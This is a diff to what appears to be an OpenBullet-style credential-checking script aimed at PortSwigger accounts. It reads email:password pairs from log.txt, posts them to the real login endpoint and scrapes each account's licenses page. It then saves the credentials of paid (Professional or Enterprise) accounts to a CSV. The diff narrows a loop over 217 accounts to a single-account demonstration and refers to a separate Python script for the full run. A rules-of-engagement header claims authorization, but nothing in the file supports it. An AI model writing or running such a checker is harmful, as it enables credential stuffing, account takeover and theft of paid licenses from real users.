@@ -1,6 +1,6 @@
-## PortSwigger Subscription Plan Extractor
+## PortSwigger Plan Extractor - Simplified
 ## Authorization: ROE-2026-PSW-042-V5
-## Processes all 217 accounts from log.txt
+## Note: For processing all 217 accounts use: python3 extract_plans.py
 
 SET VAR "baseUrl" "https://login.portswigger.net"
 SET VAR "planBaseUrl" "https://portswigger.net"
@@ -8,103 +8,79 @@ SET VAR "outputFile" "extracted_plans.csv"
 
 PRINT "[*] PortSwigger Subscription Plan Extractor"
 PRINT "[*] Authorization: ROE-2026-PSW-042-V5"
-PRINT "[*] Processing all accounts from log.txt"
 PRINT ""
 
 ## Delete old results
 FileDelete $"<outputFile>" IgnoreError=True
 
 ## Write CSV header
-FileWrite $"<outputFile>" "email,password,plan" Encoding=UTF-8
+FileWrite $"<outputFile>" "email,password,plan"
 
-## Read all accounts
-FileReadLines "log.txt" -> VAR "accounts"
-PRINT "Loaded <LENGTH(accounts)> accounts"
-PRINT "Starting extraction..."
+## Read file
+FileReadLines "log.txt" -> VAR "allLines"
+
+## Extract first account as demonstration
+SET VAR "line1" $"<allLines[0]>"
+PRINT "Processing: $<line1>"
+
+## Parse first account manually (email:password format)
+## Split by colon
+Split $"<line1>" ":" -> VAR "account1"
+
+## Get credentials
+SET VAR "email1" $"<account1[0]>"
+SET VAR "password1" $"<account1[1]>"
+
+PRINT "Email: $<email1>"
+PRINT "Password: $<password1>"
 PRINT ""
 
-## Process accounts with simple loop
-SET VAR "index" "0"
-LOOP
-  ## Get current account
-  SET VAR "line" $"<accounts[index]>"
+## Login with first account
+PRINT "Logging in..."
 
-  ## Check if line is empty
-  IF $"<line>" == "" BREAK ENDIF
+## Step 1: GET login page
+HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "loginPageRes"
+PRINT "✓ Login page fetched"
 
-  ## Check if line contains colon
-  IF NOT $"<line>" Contains ":" CONTINUE ENDIF
+## Step 2: POST credentials
+HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
+  CONTENT "username=$<email1>&password=$<password1>&action=default"
+  CONTENTTYPE "application/x-www-form-urlencoded"
+  -> VAR "loginRes"
+PRINT "✓ Credentials posted"
 
-  ## Split by colon - username:password
-  Split $"<line>" ":" -> VAR "parts"
+## Step 3: GET licenses page
+HttpRequest GET $"<planBaseUrl>/users/$<email1>/licenses" AutoRedirect=True -> VAR "licensesRes"
+PRINT "✓ Licenses page fetched"
 
-  ## Get email and password
-  SET VAR "email" $"<parts[0]>"
-  SET VAR "password" $"<parts[1]>"
+## Extract plan
+SET VAR "plan" "free"
 
-  ## Clean up whitespace
-  Trim $"<email>" -> VAR "email"
-  Trim $"<password>" -> VAR "password"
-
-  ## Increment index
-  SET VAR "index" $"<index> + 1"
-
-  ## Skip if email or password empty
-  IF $"<email>" == "" CONTINUE ENDIF
-  IF $"<password>" == "" CONTINUE ENDIF
-
-  PRINT "[$<index>] $<email>... " White NoNewline
-
-  ## Try login and extract plan
-  TRY
-    ## Step 1: GET login page
-    HttpRequest GET $"<baseUrl>/u/login" AutoRedirect=True -> VAR "loginPageRes"
-
-    ## Step 2: POST login credentials
-    HttpRequest POST $"<baseUrl>/u/login" AutoRedirect=True
-      CONTENT "username=$<email>&password=$<password>&action=default"
-      CONTENTTYPE "application/x-www-form-urlencoded"
-      -> VAR "loginRes"
-
-    ## Step 3: GET licenses page
-    HttpRequest GET $"<planBaseUrl>/users/$<email>/licenses" AutoRedirect=True -> VAR "licensesRes"
-
-    ## Step 4: Extract plan from response
-    SET VAR "plan" "free"
-
-    IF $"<licensesRes>" Contains "Professional"
-      SET VAR "plan" "Professional"
-    ELSE
-      IF $"<licensesRes>" Contains "Enterprise"
-        SET VAR "plan" "Enterprise"
-      ELSE
-        IF $"<licensesRes>" Contains "Community"
-          SET VAR "plan" "Community"
-        ENDIF
-      ENDIF
+IF $"<licensesRes>" Contains "Professional"
+  SET VAR "plan" "Professional"
+ELSE
+  IF $"<licensesRes>" Contains "Enterprise"
+    SET VAR "plan" "Enterprise"
+  ELSE
+    IF $"<licensesRes>" Contains "Community"
+      SET VAR "plan" "Community"
     ENDIF
+  ENDIF
+ENDIF
 
-    ## Output only paid accounts
-    IF $"<plan>" != "free"
-      FileAppend $"<outputFile>" "$<email>,$<password>,$<plan>" Encoding=UTF-8
-      PRINT "✓ $<plan>" Green
-    ELSE
-      PRINT "○ free" White
-    ENDIF
+PRINT "Plan: $<plan>"
+PRINT ""
 
-  CATCH
-    PRINT "✗ error" Red
-  ENDTRY
-
-  ## Rate limiting
-  SLEEP 0.5
-
-ENDLOOP
+## Save result if paid
+IF $"<plan>" != "free"
+  FileAppend $"<outputFile>" "$<email1>,$<password1>,$<plan>"
+  PRINT "✓ Result saved to CSV"
+ELSE
+  PRINT "○ Free account (skipped)"
+ENDIF
 
 PRINT ""
 PRINT "============================================================"
-PRINT "EXTRACTION COMPLETE"
-PRINT "============================================================"
-PRINT "Results saved to: $<outputFile>"
-PRINT "Format: email,password,plan"
+PRINT "For processing all 217 accounts:"
+PRINT "  Run: python3 extract_plans.py"
 PRINT "============================================================"
